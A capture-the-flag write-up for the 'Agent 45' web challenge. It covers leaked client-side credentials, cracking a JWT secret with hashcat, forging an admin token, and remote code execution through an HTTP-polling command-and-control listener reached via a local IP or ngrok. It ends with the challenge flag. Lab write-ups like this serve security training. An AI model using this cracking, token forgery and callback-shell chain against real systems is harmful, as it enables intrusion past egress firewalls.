

# Agent 45 – Challenge Writeup

## Challenge Description

* **Name:** Agent 45
* **Category:** Web 
* **Difficulty:** Medium

![Challenge Banner](https://github.com/user-attachments/assets/ef8bbdfe-a8dd-4682-bcf8-bc26da8a84e2)

This challenge simulates a realistic attack chain involving client-side information disclosure, JWT-based privilege escalation, and remote code execution behind restrictive egress firewall rules.

---

## Step 1: Reconnaissance & Hidden Credentials

1. Navigate to the login page.
2. Inspect the page source and observe the following script inclusion:

   ```html
   <script src="/static/js/main.js"></script>
   ```
3. Open `main.js` via the browser DevTools (**Sources** tab).

Inside `main.js`, a **simulated operating system environment** is implemented in JavaScript.

![Simulated OS Environment](https://github.com/user-attachments/assets/63663443-233c-4a7c-b57e-332585e69b74)

4. While reviewing the code, references to a virtual filesystem (`VIRTUAL_FS`) and obfuscated arrays such as `_0xSTR` or `_0xHIDDEN` can be observed.

![Hidden Array in main.js](https://github.com/user-attachments/assets/62d23c65-db56-46b0-b391-0e0b49ebd3d8)

5. Within these arrays, the following Base64-encoded string is found:

```
YWdlbnQ0NV9hY2Nlc3NfZ3JhbnRlZA==
```

6. Decode the string:

```bash
echo "YWdlbnQ0NV9hY2Nlc3NfZ3JhbnRlZA==" | base64 -d
```

**Output:**

```
agent45_access_granted
```

7. Log in using the recovered credentials:

* **Username:** `agent45`
* **Password:** `agent45_access_granted`

![Login Successful](https://github.com/user-attachments/assets/889f9eab-06d8-444d-bae6-a7133d44d1cf)

---

## Step 2: JWT Cracking

1. After login, you are redirected to `/dashboard`.
2. Inspect browser cookies and locate the `auth_token`.
3. Decode the JWT (e.g., using `jwt.io`) to reveal the payload:

```json
{
  "username": "agent45",
  "role": "user",
  "exp": 1700000000
}
```

![JWT Payload](https://github.com/user-attachments/assets/14eb42d1-296b-44e0-96ce-f2df7743a4e3)

4. The token uses **HS256**, indicating a symmetric signing key.
5. Extract the token into a file (`jwt.txt`) and crack it using **Hashcat**:

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

6. The JWT secret is recovered:

```
maspinakacuteako
```

---

## Step 3: Privilege Escalation via JWT Forgery

1. Using the recovered secret, forge a new JWT with administrative privileges.

```python
import jwt

token = jwt.encode(
    {'username': 'admin', 'role': 'admin'},
    'maspinakacuteako',
    algorithm='HS256'
)

print(token)
```

2. Replace the `auth_token` cookie in your browser with the forged token.
3. Navigate to `/admin`.

You now have access to the **Admin Panel**.

![Admin Panel](https://github.com/user-attachments/assets/c0924c29-c73a-478f-b9c5-d4b3f2b1a06c)

![Admin Features](https://github.com/user-attachments/assets/1bcbafb4-2f9a-4a1b-ab5e-8cd2a7d16310)

---

Step 4: Remote Code Execution via HTTP Polling

The Admin Panel provides a file upload feature that executes uploaded .py files.
A warning is displayed:

OUTBOUND FIREWALL ACTIVE
Only HTTP/HTTPS (ports 80/443) traffic is permitted.

Because outbound connections are restricted, a traditional reverse shell (raw TCP) will fail.
To bypass this, an HTTP polling–based shell is used.

Case 1: Local Challenge Deployment (No ngrok)

This challenge was initially solved locally, where the attacker and target existed on the same network.

In this setup:

The listener runs directly on the attacker machine

The payload connects to a local IP (e.g., Docker bridge or host IP)

No port forwarding or tunneling is required

Attacker Setup (Local)

Create the listener (listener.py):

from flask import Flask, request

app = Flask(__name__)

@app.route('/poll', methods=['GET'])
def poll():
    cmd = input("Shell> ")
    return cmd

@app.route('/result', methods=['POST'])
def result():
    print(request.data.decode())
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)


Run it:

python3 listener.py


The payload connects directly to the local listener:

C2_URL = "http://172.17.0.1:8000"

Case 2: Hosted / Remote Challenge Deployment (ngrok Required)

When the challenge is hosted remotely, the target server cannot directly reach the attacker’s local machine.

In this scenario:

ngrok is required to expose the local listener

The payload communicates over HTTP using the ngrok forwarding URL

This simulates real-world command-and-control traffic over allowed ports

Attacker Setup (Hosted Scenario)

Start the listener locally:

python3 listener.py


Expose it using ngrok:

ngrok http 8000


Update the payload to use the ngrok URL:

C2_URL = "https://<your-ngrok-subdomain>.ngrok.io"

Exploitation Flow (Both Cases)

Upload payload.py via the Admin Panel.

The server executes the payload.

The payload continuously polls the attacker endpoint for commands.

Commands are executed server-side.

Output is returned via HTTP POST.

### Exploitation & Flag Retrieval

1. Upload `payload.py` via the Admin Panel.
2. The server executes the payload and begins polling the attacker-controlled endpoint.
3. A shell prompt appears in the listener.

```text
Shell>
```

4. Retrieve the flag:

```bash
cat /root/flag.txt
```

![Flag Retrieved](https://github.com/user-attachments/assets/50b3b5ed-f613-496d-86ff-fb76ad62d177)

---

## Flag

```
L3m0nctf{4g3n7_45_m15510n_c0mpl373d_w3ll_d0n3}
```

---


